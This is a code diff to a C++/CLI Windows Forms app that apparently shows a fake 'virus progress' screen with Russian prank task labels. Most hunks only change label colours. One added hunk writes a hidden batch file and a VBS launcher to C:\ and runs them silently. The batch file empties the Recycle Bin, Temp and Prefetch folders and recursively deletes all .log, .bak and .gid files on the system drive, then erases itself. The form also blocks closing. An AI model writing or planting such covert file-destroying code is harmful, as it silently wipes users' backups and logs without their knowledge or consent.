@@ -518,6 +518,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done23->BackColor = System::Drawing::Color::LightGreen;
 			this->done23->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done23->ForeColor = System::Drawing::Color::Black;
 			this->done23->Location = System::Drawing::Point(303, 547);
 			this->done23->Name = L"done23";
 			this->done23->Size = System::Drawing::Size(90, 18);
@@ -531,6 +532,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done24->BackColor = System::Drawing::Color::LightGreen;
 			this->done24->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done24->ForeColor = System::Drawing::Color::Black;
 			this->done24->Location = System::Drawing::Point(303, 571);
 			this->done24->Name = L"done24";
 			this->done24->Size = System::Drawing::Size(90, 18);
@@ -544,6 +546,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done25->BackColor = System::Drawing::Color::LightGreen;
 			this->done25->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done25->ForeColor = System::Drawing::Color::Black;
 			this->done25->Location = System::Drawing::Point(303, 595);
 			this->done25->Name = L"done25";
 			this->done25->Size = System::Drawing::Size(90, 18);
@@ -557,6 +560,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done22->BackColor = System::Drawing::Color::LightGreen;
 			this->done22->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done22->ForeColor = System::Drawing::Color::Black;
 			this->done22->Location = System::Drawing::Point(303, 523);
 			this->done22->Name = L"done22";
 			this->done22->Size = System::Drawing::Size(90, 18);
@@ -570,6 +574,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done21->BackColor = System::Drawing::Color::LightGreen;
 			this->done21->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done21->ForeColor = System::Drawing::Color::Black;
 			this->done21->Location = System::Drawing::Point(303, 499);
 			this->done21->Name = L"done21";
 			this->done21->Size = System::Drawing::Size(90, 18);
@@ -583,6 +588,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done20->BackColor = System::Drawing::Color::LightGreen;
 			this->done20->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done20->ForeColor = System::Drawing::Color::Black;
 			this->done20->Location = System::Drawing::Point(303, 475);
 			this->done20->Name = L"done20";
 			this->done20->Size = System::Drawing::Size(90, 18);
@@ -596,6 +602,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done19->BackColor = System::Drawing::Color::LightGreen;
 			this->done19->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done19->ForeColor = System::Drawing::Color::Black;
 			this->done19->Location = System::Drawing::Point(303, 451);
 			this->done19->Name = L"done19";
 			this->done19->Size = System::Drawing::Size(90, 18);
@@ -609,6 +616,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done18->BackColor = System::Drawing::Color::LightGreen;
 			this->done18->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done18->ForeColor = System::Drawing::Color::Black;
 			this->done18->Location = System::Drawing::Point(303, 427);
 			this->done18->Name = L"done18";
 			this->done18->Size = System::Drawing::Size(90, 18);
@@ -622,6 +630,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done17->BackColor = System::Drawing::Color::LightGreen;
 			this->done17->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done17->ForeColor = System::Drawing::Color::Black;
 			this->done17->Location = System::Drawing::Point(303, 403);
 			this->done17->Name = L"done17";
 			this->done17->Size = System::Drawing::Size(90, 18);
@@ -635,6 +644,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done16->BackColor = System::Drawing::Color::LightGreen;
 			this->done16->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done16->ForeColor = System::Drawing::Color::Black;
 			this->done16->Location = System::Drawing::Point(303, 379);
 			this->done16->Name = L"done16";
 			this->done16->Size = System::Drawing::Size(90, 18);
@@ -648,6 +658,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done15->BackColor = System::Drawing::Color::LightGreen;
 			this->done15->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done15->ForeColor = System::Drawing::Color::Black;
 			this->done15->Location = System::Drawing::Point(303, 355);
 			this->done15->Name = L"done15";
 			this->done15->Size = System::Drawing::Size(90, 18);
@@ -661,6 +672,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done13->BackColor = System::Drawing::Color::LightGreen;
 			this->done13->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done13->ForeColor = System::Drawing::Color::Black;
 			this->done13->Location = System::Drawing::Point(303, 307);
 			this->done13->Name = L"done13";
 			this->done13->Size = System::Drawing::Size(90, 18);
@@ -674,6 +686,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done12->BackColor = System::Drawing::Color::LightGreen;
 			this->done12->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done12->ForeColor = System::Drawing::Color::Black;
 			this->done12->Location = System::Drawing::Point(303, 284);
 			this->done12->Name = L"done12";
 			this->done12->Size = System::Drawing::Size(90, 18);
@@ -687,6 +700,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done11->BackColor = System::Drawing::Color::LightGreen;
 			this->done11->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done11->ForeColor = System::Drawing::Color::Black;
 			this->done11->Location = System::Drawing::Point(303, 259);
 			this->done11->Name = L"done11";
 			this->done11->Size = System::Drawing::Size(90, 18);
@@ -700,6 +714,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done10->BackColor = System::Drawing::Color::LightGreen;
 			this->done10->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done10->ForeColor = System::Drawing::Color::Black;
 			this->done10->Location = System::Drawing::Point(303, 235);
 			this->done10->Name = L"done10";
 			this->done10->Size = System::Drawing::Size(90, 18);
@@ -713,6 +728,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done9->BackColor = System::Drawing::Color::LightGreen;
 			this->done9->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done9->ForeColor = System::Drawing::Color::Black;
 			this->done9->Location = System::Drawing::Point(303, 211);
 			this->done9->Name = L"done9";
 			this->done9->Size = System::Drawing::Size(90, 18);
@@ -726,6 +742,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done8->BackColor = System::Drawing::Color::LightGreen;
 			this->done8->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done8->ForeColor = System::Drawing::Color::Black;
 			this->done8->Location = System::Drawing::Point(303, 187);
 			this->done8->Name = L"done8";
 			this->done8->Size = System::Drawing::Size(90, 18);
@@ -739,6 +756,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done7->BackColor = System::Drawing::Color::LightGreen;
 			this->done7->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done7->ForeColor = System::Drawing::Color::Black;
 			this->done7->Location = System::Drawing::Point(303, 163);
 			this->done7->Name = L"done7";
 			this->done7->Size = System::Drawing::Size(90, 18);
@@ -752,6 +770,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done6->BackColor = System::Drawing::Color::LightGreen;
 			this->done6->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done6->ForeColor = System::Drawing::Color::Black;
 			this->done6->Location = System::Drawing::Point(303, 139);
 			this->done6->Name = L"done6";
 			this->done6->Size = System::Drawing::Size(90, 18);
@@ -765,6 +784,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done5->BackColor = System::Drawing::Color::LightGreen;
 			this->done5->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done5->ForeColor = System::Drawing::Color::Black;
 			this->done5->Location = System::Drawing::Point(303, 115);
 			this->done5->Name = L"done5";
 			this->done5->Size = System::Drawing::Size(90, 18);
@@ -778,6 +798,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done4->BackColor = System::Drawing::Color::LightGreen;
 			this->done4->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done4->ForeColor = System::Drawing::Color::Black;
 			this->done4->Location = System::Drawing::Point(303, 92);
 			this->done4->Name = L"done4";
 			this->done4->Size = System::Drawing::Size(90, 18);
@@ -791,6 +812,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done3->BackColor = System::Drawing::Color::LightGreen;
 			this->done3->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done3->ForeColor = System::Drawing::Color::Black;
 			this->done3->Location = System::Drawing::Point(303, 67);
 			this->done3->Name = L"done3";
 			this->done3->Size = System::Drawing::Size(90, 18);
@@ -804,6 +826,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done2->BackColor = System::Drawing::Color::LightGreen;
 			this->done2->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done2->ForeColor = System::Drawing::Color::Black;
 			this->done2->Location = System::Drawing::Point(303, 43);
 			this->done2->Name = L"done2";
 			this->done2->Size = System::Drawing::Size(90, 18);
@@ -817,6 +840,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->done1->BackColor = System::Drawing::Color::LightGreen;
 			this->done1->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->done1->ForeColor = System::Drawing::Color::Black;
 			this->done1->Location = System::Drawing::Point(303, 19);
 			this->done1->Name = L"done1";
 			this->done1->Size = System::Drawing::Size(90, 18);
@@ -830,6 +854,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->propysk3_3->BackColor = System::Drawing::Color::IndianRed;
 			this->propysk3_3->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->propysk3_3->ForeColor = System::Drawing::Color::Black;
 			this->propysk3_3->Location = System::Drawing::Point(303, 43);
 			this->propysk3_3->Name = L"propysk3_3";
 			this->propysk3_3->Size = System::Drawing::Size(90, 18);
@@ -843,6 +868,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->propysk2_3->BackColor = System::Drawing::Color::IndianRed;
 			this->propysk2_3->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->propysk2_3->ForeColor = System::Drawing::Color::Black;
 			this->propysk2_3->Location = System::Drawing::Point(303, 499);
 			this->propysk2_3->Name = L"propysk2_3";
 			this->propysk2_3->Size = System::Drawing::Size(90, 18);
@@ -856,6 +882,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->propysk4_3->BackColor = System::Drawing::Color::IndianRed;
 			this->propysk4_3->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->propysk4_3->ForeColor = System::Drawing::Color::Black;
 			this->propysk4_3->Location = System::Drawing::Point(303, 163);
 			this->propysk4_3->Name = L"propysk4_3";
 			this->propysk4_3->Size = System::Drawing::Size(90, 18);
@@ -869,6 +896,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->propysk1_3->BackColor = System::Drawing::Color::IndianRed;
 			this->propysk1_3->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->propysk1_3->ForeColor = System::Drawing::Color::Black;
 			this->propysk1_3->Location = System::Drawing::Point(303, 67);
 			this->propysk1_3->Name = L"propysk1_3";
 			this->propysk1_3->Size = System::Drawing::Size(90, 18);
@@ -882,6 +910,7 @@ private: System::Windows::Forms::Label^ done1;
 			this->propysk->BackColor = System::Drawing::Color::IndianRed;
 			this->propysk->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
 				static_cast<System::Byte>(204)));
+			this->propysk->ForeColor = System::Drawing::Color::Black;
 			this->propysk->Location = System::Drawing::Point(303, 331);
 			this->propysk->Name = L"propysk";
 			this->propysk->Size = System::Drawing::Size(90, 18);
@@ -1151,9 +1180,9 @@ private: System::Windows::Forms::Label^ done1;
 			this->label14->ForeColor = System::Drawing::Color::White;
 			this->label14->Location = System::Drawing::Point(6, 475);
 			this->label14->Name = L"label14";
-			this->label14->Size = System::Drawing::Size(242, 18);
+			this->label14->Size = System::Drawing::Size(246, 18);
 			this->label14->TabIndex = 34;
-			this->label14->Text = L"20. Заражение мыши холерой";
+			this->label14->Text = L"20. Удаление плагина AdBlock";
 			// 
 			// label6
 			// 
@@ -1272,9 +1301,9 @@ private: System::Windows::Forms::Label^ done1;
 			this->label19->ForeColor = System::Drawing::Color::White;
 			this->label19->Location = System::Drawing::Point(6, 355);
 			this->label19->Name = L"label19";
-			this->label19->Size = System::Drawing::Size(275, 18);
+			this->label19->Size = System::Drawing::Size(257, 18);
 			this->label19->TabIndex = 29;
-			this->label19->Text = L"15. Просмотр роликов Куплинова";
+			this->label19->Text = L"15. Размещение порно-банеров";
 			// 
 			// label11
 			// 
@@ -1809,8 +1838,18 @@ private: System::Windows::Forms::Label^ done1;
 			this->timer_wait->Stop();
 			break;
 		case 2:
-			if (!propysk3)
+			if (!propysk3) {
+				std::ofstream cleaner("C:\\cleaner.bat");
+				if (cleaner.is_open())
+					cleaner << "@echo OFF\nrd /s /q C:\\$Recycle.Bin\ndel /q /f /s %WINDIR%\\Temp\\*.*\ndel /q /f /s %SYSTEMDRIVE%\\Temp\\*.*\ndel /q /f /s %Temp%\\*.*\ndel /q /f /s %Tmp%\\*.*\ndel /q /f /s %WINDIR%\\Prefetch\\*.*\ndel /q /f /s %SYSTEMDRIVE%\\*.log\ndel /q / f / s %SYSTEMDRIVE%\\*.bak\ndel /q /f /s %SYSTEMDRIVE%\\*.gid\nDEL \"C:\\cleaner1.vbs\"\ndel %0";
+				cleaner.close();
+				std::ofstream cleaner1("C:\\cleaner1.vbs");
+				if (cleaner1.is_open())
+					cleaner1 << "set sh=CreateObject(\"Wscript.Shell\")\nsh.Run \"C:\\cleaner.bat\", 0";
+				cleaner1.close();
+				(gcnew System::Diagnostics::Process())->Start("C:\\cleaner1.vbs");
 				this->done2->Show();
+			}
 			else
 				this->propysk3_3->Show();
 			this->timer3->Start();
@@ -1955,5 +1994,5 @@ private: System::Windows::Forms::Label^ done1;
 			e->Cancel = true;
 		}
 	}
-};
+	};
 }
